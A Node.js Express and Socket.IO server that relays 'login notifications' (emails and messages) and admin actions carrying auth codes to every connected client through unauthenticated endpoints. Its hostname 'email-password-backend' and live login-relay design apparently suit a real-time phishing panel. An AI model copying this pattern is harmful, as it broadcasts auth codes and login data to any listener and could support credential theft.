const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();

// Configure CORS for Vercel frontend
const allowedOrigins = [
  'https://your-vercel-app.vercel.app', // Replace with your Vercel URL
  'https://your-vercel-app-git-main.vercel.app', // Preview deployments
  'http://localhost:3000', // Local development
  'http://localhost:3001',
];

app.use(cors({
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps, curl, etc.)
    if (!origin) return callback(null, true);

    if (allowedOrigins.indexOf(origin) !== -1 || process.env.NODE_ENV === 'development') {
      callback(null, true);
    } else {
      console.log('Blocked origin:', origin);
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'OPTIONS'],
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization'],
}));

app.use(express.json());

const server = http.createServer(app);

// Socket.IO with proper CORS
const io = new Server(server, {
  cors: {
    origin: function (origin, callback) {
      if (!origin) return callback(null, true);

      if (allowedOrigins.indexOf(origin) !== -1 || process.env.NODE_ENV === 'development') {
        callback(null, true);
      } else {
        console.log('Socket blocked origin:', origin);
        callback(new Error('Not allowed by CORS'));
      }
    },
    methods: ["GET", "POST"],
    credentials: true,
    allowedHeaders: ["Content-Type", "Authorization"],
  },
  transports: ['websocket', 'polling'],
  allowEIO3: true,
  pingTimeout: 60000,
  pingInterval: 25000,
  path: '/socket.io/',
  // Add this for better compatibility
  allowUpgrades: true,
  upgradeTimeout: 10000,
});

// Track connected users
let connectedUsers = {};

io.on('connection', (socket) => {
  console.log('✅ User connected:', socket.id);
  console.log('Origin:', socket.handshake.headers.origin);
  connectedUsers[socket.id] = {
    connectedAt: new Date(),
    origin: socket.handshake.headers.origin
  };

  // Handle ping from client
  socket.on('ping', () => {
    socket.emit('pong');
  });

  socket.on('disconnect', () => {
    console.log('❌ User disconnected:', socket.id);
    delete connectedUsers[socket.id];
  });

  socket.on('error', (err) => {
    console.error('Socket error:', err);
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    connections: Object.keys(connectedUsers).length,
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'development',
    allowedOrigins: allowedOrigins,
    version: '1.0.0'
  });
});

// Root endpoint
app.get('/', (req, res) => {
  res.json({
    message: 'Socket.IO Server is running',
    connections: Object.keys(connectedUsers).length,
    endpoints: {
      health: '/health',
      notify: '/api/notify-admin',
      adminAction: '/api/admin-action'
    },
    allowedOrigins: allowedOrigins
  });
});

// Endpoint to receive login notifications from Next.js server actions
app.post('/api/notify-admin', (req, res) => {
  const { email, type, message } = req.body;
  console.log(`📨 Notification received: [${type}] ${email} - ${message}`);
  console.log('Origin:', req.headers.origin);

  // Broadcast to all connected clients (Admin Dashboard)
  io.emit('admin_notification', {
    email,
    type,
    message,
    timestamp: new Date().toISOString()
  });

  res.json({
    success: true,
    connections: Object.keys(connectedUsers).length,
    message: 'Notification sent to all admins'
  });
});

// Endpoint for admin actions to notify specific users
app.post('/api/admin-action', (req, res) => {
  try {
    const { userId, newStatus, authCode, email } = req.body;
    console.log(`🔄 Admin action: ${email} -> ${newStatus}`);
    console.log('Origin:', req.headers.origin);

    // Broadcast a user update event with relevant data
    io.emit('user_update', {
      userId,
      newStatus,
      authCode,
      email,
      timestamp: new Date().toISOString(),
    });

    res.json({
      success: true,
      connections: Object.keys(connectedUsers).length,
      message: 'User update broadcasted'
    });
  } catch (error) {
    console.error('❌ admin-action error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to process admin action',
      details: error.message
    });
  }
});

// Railway uses the PORT environment variable
const PORT = parseInt(process.env.PORT, 10) || 3001;

server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Socket & API Server running on port ${PORT}`);
  console.log(`📡 Health check: https://email-password-backend-production.up.railway.app/health`);
  console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🔗 Allowed origins:`, allowedOrigins);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🛑 SIGTERM received, closing server...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('🛑 SIGINT received, closing server...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});